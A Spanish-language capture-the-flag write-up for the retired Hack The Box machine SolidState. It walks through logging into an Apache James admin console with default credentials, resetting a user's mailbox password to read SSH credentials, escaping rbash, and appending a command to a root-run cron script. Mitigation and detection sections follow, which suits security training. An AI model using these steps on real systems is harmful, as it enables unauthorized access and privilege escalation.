---
machine: SolidState
os: Linux
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [linux, apache-james, default-creds, pop3, rbash, cron]
---

# SolidState — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired (ref.), publicable.
> Ficha de referencia de una máquina retirada. Sin flags ni credenciales reales.

## TL;DR

Servidor de correo **Apache James 2.3.2** con la administración remota en 4555 y credenciales por defecto `root:root`. Se listan los usuarios, se resetea la contraseña de `mindy`, se lee su buzón por POP3 y de ahí salen **credenciales SSH**. `mindy` entra con `rbash`, que se escapa con `bash --noprofile`, y root ejecuta por cron un **`/opt/tmp.py` escribible**.

## Reconocimiento

```bash
nmap -p- --min-rate 5000 -sV -sC <IP> -oN nmap.txt
```

```text
22/tcp    ssh   OpenSSH 7.4p1 Debian 10+deb9u1
25/tcp    smtp  JAMES smtpd 2.3.2
80/tcp    http  Apache httpd 2.4.25 (Debian)
110/tcp   pop3  JAMES popd 2.3.2
119/tcp   nntp  JAMES nntpd (posting ok)
4555/tcp  rsip  JAMES Remote Administration Tool 2.3.2
```

La web es la página de la empresa. Lo interesante son los puertos de correo y el 4555, que `nmap` identifica con el banner de administración de James.

## Enumeración

- **4555/tcp** devuelve el banner `JAMES Remote Administration Tool 2.3.2`: es la administración remota del servidor de correo, no un servicio web.
- **110/tcp** (POP3) y **119/tcp** (NNTP) son del mismo James; **25/tcp** es el SMTP y **80/tcp** sólo sirve la página corporativa, sin aplicación.
- Con `root:root` en el 4555, `listusers` enumera las cinco cuentas (`james`, `thomas`, `john`, `mindy`, `mailadmin`) y `setpassword` permite fijar la contraseña de cualquiera.

## Foothold

```bash
nc <IP> 4555
```

```text
JAMES Remote Administration Tool 2.3.2
Login id: root
Password: root
Welcome root. HELP for a list of commands
listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
```

Se resetea la contraseña de un usuario y se lee su buzón por POP3:

```text
setpassword mindy <password>
```

```bash
telnet <IP> 110
```

```text
USER mindy
PASS <password>
LIST
RETR 1
```

El mensaje de bienvenida trae las credenciales de SSH de `mindy` (usuario y contraseña en claro).

```bash
ssh mindy@<IP>
cat ~/user.txt
```

Vía alternativa de acceso: el exploit público de **James 2.3.2** (autenticado en 4555) ejecuta comandos y da shell como `james`.

## Movimiento lateral

No aplica: `mindy` es el usuario final y el cron de root cierra la máquina. El «salto» real es de servicio a servicio dentro del mismo host: administración del correo (4555) → buzón (110) → SSH (22).

## Escalada de privilegios

```bash
echo $SHELL
# /bin/rbash
ssh mindy@<IP> -t "bash --noprofile"
```

Con bash sin perfil ya se navega normalmente. Enumeración:

```bash
ls -la /opt
cat /opt/tmp.py
```

```python
#!/usr/bin/env python
import os, sys
try:
    os.system('rm -r /tmp/* ')
except:
    sys.exit()
```

El script es **propiedad de root y escribible por `mindy`**, y root lo ejecuta por cron (`pspy` lo confirma). Se añade una línea que copie la flag o dé una shell:

```bash
printf '\nos.system("cp /root/root.txt /tmp/root.txt; chmod 644 /tmp/root.txt")\n' >> /opt/tmp.py
cat /tmp/root.txt
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- Un servicio de administración con `root:root` entrega el correo y, con él, las credenciales que la gente se manda por correo.
- `rbash` se evade con `bash --noprofile` en el mismo SSH; restringir el shell sin restringir el binario no sirve.
- Un script en `/opt` que root ejecuta por cron y otro usuario puede escribir es escalada directa.
- Detección: conexiones a 4555 desde fuera del segmento de correo, `setpassword` en el log de James y escrituras en `/opt` seguidas de ejecución por cron.

## Mitigaciones y detección

- No exponer la administración remota de James y, si se expone, cambiar `root:root` y limitarla por red.
- Actualizar Apache James (2.3.2 es de 2009) y deshabilitar `setpassword` remoto.
- Nunca enviar credenciales de sistema por correo; y no reutilizar la contraseña del buzón como contraseña SSH.
- `rbash` sólo funciona si el usuario no puede ejecutar otro binario: `ssh -t "bash --noprofile"` lo demuestra.
- `/opt/tmp.py` debe ser `root:root 0755`; un script de cron escribible por otros es root.
- Detección: conexiones externas al 4555, `setpassword` en el log de James y escrituras en `/opt` seguidas de ejecución por cron.

## Referencias

- [Apache James 2.3.2 — RCE (Exploit-DB 35513)](https://www.exploit-db.com/exploits/35513)
- [Hack The Box — SolidState](https://www.hackthebox.com/machines/solidstate)
